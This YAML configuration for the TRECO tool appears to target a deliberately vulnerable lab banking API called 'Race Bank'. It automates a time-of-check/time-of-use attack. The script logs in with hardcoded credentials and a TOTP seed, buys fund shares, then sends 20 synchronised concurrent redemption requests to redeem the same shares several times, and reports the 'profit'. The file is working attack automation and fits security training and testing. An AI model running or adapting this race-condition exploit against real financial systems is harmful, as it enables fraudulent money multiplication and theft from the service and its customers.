# ============================================================================
# TRECO Configuration: Race Bank - Fund Redemption Attack
# ============================================================================
#
# Exploits race conditions in fund redemption operations by sending multiple
# concurrent requests that attempt to redeem the same investment simultaneously.
#
# Target: Hack N' Roll Race Bank API
# Attack: TOCTOU (Time-of-Check Time-of-Use) in redemption endpoint
#
# Usage:
#   uv run treco race-bank-redemption.yaml
#
# ============================================================================

metadata:
  name: "Race Bank - Fund Redemption Attack"
  version: "2.0"
  author: "Hack N' Roll Security Team"
  vulnerability: "CWE-362 (TOCTOU)"
  description: |
    Server fails to properly synchronize redemption operations, allowing
    multiple redemptions of the same investment - money multiplication.

target:
  host: "bankao-api.local"
  port: 80
  threads: 20
  reuse_connection: false
  tls:
    enabled: false
    verify_cert: false
  proxy:
    type: http
    host: 127.0.0.1
    port: 8080

entrypoint:
  state: auth_login
  input:
    username: "crash"
    password: "bhack123"
    totp_seed: "OZDIJJEHAXPAGSBXPG5TLGDIZKFR7YNT"
    subscribe_amount: 200
    redeem_amount: 20

# ============================================================================
# STATES
# ============================================================================

states:

  # --------------------------------------------------------------------------
  # Authentication
  # --------------------------------------------------------------------------

  auth_login:
    description: "Login with credentials"
    request: |
      POST /login HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/json
      
      {"username": "{{ username }}", "password": "{{ password }}"}

    extract:
      temp_token:
        type: jpath
        pattern: "$.token"

    logger:
      on_state_enter: |

        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ¦ TRECO - Fund Redemption Race Attack                             â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  ğŸ¯ Target: {{ "%-55s" | format(target.host)                     }} â•‘
        â•‘  ğŸ‘¤ User:   {{ "%-55s" | format(username)                        }} â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

      on_state_leave: |
        ğŸ” Login successful â†’ temp token received

    next:
      - on_status: 200
        goto: auth_2fa
      - on_status: 401
        goto: auth_failed

  auth_2fa:
    description: "TOTP verification"
    request: |
      POST /2fa HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/json
      Authorization: Bearer {{ auth_login.temp_token }}
      
      {"token": "{{ totp(totp_seed) }}"}

    extract:
      token:
        type: jpath
        pattern: "$.access_token"

    logger:
      on_state_leave: |
        ğŸ”‘ 2FA verified â†’ session established

    next:
      - on_status: 200
        goto: get_initial_balance
      - on_status: 401
        goto: auth_failed

  auth_failed:
    description: "Authentication failed"
    logger:
      on_state_enter: |
        âŒ Authentication failed - check credentials
    next:
      - goto: end

  # --------------------------------------------------------------------------
  # Setup Phase
  # --------------------------------------------------------------------------

  get_initial_balance:
    description: "Get initial balance"
    request: |
      GET /balance HTTP/1.1
      Host: {{ target.host }}
      Authorization: Bearer {{ auth_2fa.token }}

    extract:
      cash:
        type: jpath
        pattern: "$.cash_balance"
      shares:
        type: jpath
        pattern: "$.fund_shares"

    logger:
      on_state_leave: |
        ğŸ’° Balance: ${{ get_initial_balance.cash }} | ğŸ“ˆ Shares: {{ get_initial_balance.shares }}

    next:
      - on_status: 200
        goto: redemption

  redemption:
    description: "Redeem shared"
    request: |
      POST /redemption HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/json
      Authorization: Bearer {{ auth_2fa.token }}
      
      {"amount": 2000}

    next:
      - on_status: 200
        goto: subscribe_fund
      - on_status: 400
        goto: subscribe_fund

  subscribe_fund:
    description: "Subscribe to fund"
    request: |
      POST /subscribe HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/json
      Authorization: Bearer {{ auth_2fa.token }}
      
      {"amount": {{ subscribe_amount }}}

    extract:
      new_shares:
        type: jpath
        pattern: "$.new_fund_shares"
      new_cash:
        type: jpath
        pattern: "$.new_cash_balance"

    logger:
      on_state_leave: |
        ğŸ“¥ Subscribed ${{ subscribe_amount }} â†’ {{ subscribe_fund.new_shares }} shares

    next:
      - on_status: 200
        goto: race_redemption

  # --------------------------------------------------------------------------
  # Race Attack
  # --------------------------------------------------------------------------

  race_redemption:
    description: "Race condition - redeem same shares multiple times"
    request: |
      POST /redemption HTTP/2
      Host: {{ target.host }}
      Content-Type: application/json
      Authorization: Bearer {{ auth_2fa.token }}
      
      {
        "amount": {{ redeem_amount }}
      }

    options:
      proxy_bypass: true

    race:
      threads: 20
      sync_mechanism: barrier
      connection_strategy: multiplexed
      thread_propagation: single

    extract:
      new_cash:
        type: jpath
        pattern: "$.new_cash_balance"
      new_shares:
        type: jpath
        pattern: "$.new_fund_shares"
      share_price:
        type: jpath
        pattern: "$.share_price"

    logger:
      on_state_enter: |

        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚  âš¡ RACE ATTACK                                                              â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  ğŸ”— Endpoint:  POST /redemption                                              â”‚
        â”‚  ğŸ§µ Threads:   20                                                            â”‚
        â”‚  ğŸ”§ Strategy:  preconnect + barrier                                          â”‚
        â”‚  ğŸ’µ Shares:    {{ "%-61s" | format(redeem_amount)                         }} â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

      on_thread_leave: |
        {% if response.status_code == 200 %}
          ğŸŸ¢ [t:{{ '%02d' | format(thread.id) }}] Redeemed â†’ ${{ new_cash }} | {{ timing_ms }}ms
        {% elif response.status_code == 409 %}
          ğŸ”´ [t:{{ '%02d' | format(thread.id) }}] Conflict (already redeemed)
        {% elif response.status_code == 423 %}
          ğŸ”´ [t:{{ '%02d' | format(thread.id) }}] Locked
        {% else %}
          ğŸŸ¡ [t:{{ '%02d' | format(thread.id) }}] {{ response.status_code }}
        {% endif %}

      on_state_leave: |

        â””â”€ âš¡ Race complete

    next:
      - goto: get_final_balance
        delay_ms: 500

  # --------------------------------------------------------------------------
  # Results
  # --------------------------------------------------------------------------

  get_final_balance:
    description: "Get final balance"
    request: |
      GET /balance HTTP/1.1
      Host: {{ target.host }}
      Authorization: Bearer {{ auth_2fa.token }}

    extract:
      cash:
        type: jpath
        pattern: "$.cash_balance"
      shares:
        type: jpath
        pattern: "$.fund_shares"

    logger:
      on_state_leave: |
        {% set initial = get_initial_balance.cash | float %}
        {% set final = get_final_balance.cash | float %}
        {% set diff = final - initial %}

        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚  ğŸ“Š RESULTS                                                                  â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  ğŸ’µ Initial Cash:    ${{ "%-54s" | format(get_initial_balance.cash)       }} â”‚
        â”‚  ğŸ’µ Final Cash:      ${{ "%-54s" | format(get_final_balance.cash)         }} â”‚
        â”‚  ğŸ“ˆ Initial Shares:   {{ "%-54s" | format(get_initial_balance.shares)     }} â”‚
        â”‚  ğŸ“ˆ Final Shares:     {{ "%-54s" | format(get_final_balance.shares)       }} â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  ğŸ“‰ Subscribed:      ${{ "%-54s" | format(subscribe_amount)               }} â”‚
        â”‚  ğŸ’° Net Change:      ${{ "%-54s" | format(diff)                           }} â”‚
        {% if diff > 0 %}
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  ğŸ‰ VULNERABLE - Money multiplied!                                           â”‚
        â”‚  ğŸ’¸ Profit: ${{ "%-64s" | format(diff)                                    }} â”‚
        {% elif diff == 0 %}
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  âš ï¸  Break even - partial exploitation?                                      â”‚
        {% else %}
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  âœ… PROTECTED - No race condition                                            â”‚
        {% endif %}
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    next:
      - goto: end

  # --------------------------------------------------------------------------
  # Terminal States
  # --------------------------------------------------------------------------

  error:
    description: "Error handler"
    logger:
      on_state_enter: |
        âŒ An error occurred during execution
    next:
      - goto: end

  end:
    description: "Complete"
    logger:
      on_state_enter: |

        â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        ğŸ Attack sequence complete
        â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€